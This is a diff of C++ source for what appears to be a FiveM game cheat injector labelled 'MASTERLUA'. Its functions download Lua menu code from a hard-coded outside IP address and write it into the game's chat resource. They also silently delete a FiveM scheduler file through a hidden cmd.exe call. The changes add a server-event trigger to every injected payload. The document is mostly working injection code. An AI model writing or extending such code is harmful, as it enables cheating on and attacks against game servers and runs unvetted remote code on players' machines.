@@ -20,11 +20,10 @@
 #include <fstream>
 #include <sstream>
 #include <strsafe.h>
+#include "newauth.h"
 #include "Console.h"
 #pragma comment(lib, "urlmon.lib")
 #define UNLEN 64
-
-string sp = a_gethid();
 
 using namespace std;
 namespace con = JadedHoboConsole;
@@ -122,7 +121,7 @@ void falloutfix(string trigger, string fastmenu)
 	if (fastmenu == "Y" || fastmenu == "y") {
 		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
 	}
-	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
+	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
 	myfile.close();
 }
 
@@ -146,7 +145,7 @@ void maestrofix(string trigger, string fastmenu)
 	if (fastmenu == "Y" || fastmenu == "y") {
 		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
 	}
-	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
+	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
 	myfile.close();
 }
 
@@ -170,7 +169,7 @@ void lynxfix(string trigger, string fastmenu)
 	if (fastmenu == "Y" || fastmenu == "y") {
 		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; + "\n";
 	}
-	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
+	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
 	myfile.close();
 }
 
@@ -194,7 +193,7 @@ void wavefix(string trigger, string fastmenu)
 	if (fastmenu == "Y" || fastmenu == "y") {
 		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
 	}
-	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
+	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
 	myfile.close();
 }
 
@@ -212,7 +211,7 @@ void triggerandfast()
 	myfile << shedulercode + "\n";
 	myfile << triggerexploit + "\n";
 	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
-	myfile << "\nif GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
+	myfile << "\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
 	myfile.close();
 
 }
@@ -243,7 +242,7 @@ void custimemenu()
 	myfile.open("C:/Users/Public/a.lua");
 	myfile << "";
 	myfile << str2;
-	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nif GetCurrentResourceName() == \"chat\" then\n" << str << "\nend";
+	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << str << "\nend";
 	myfile.close();
 
 	ShellExecuteA(0, "open", "cmd.exe", "/C del C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua", 0, SW_HIDE);
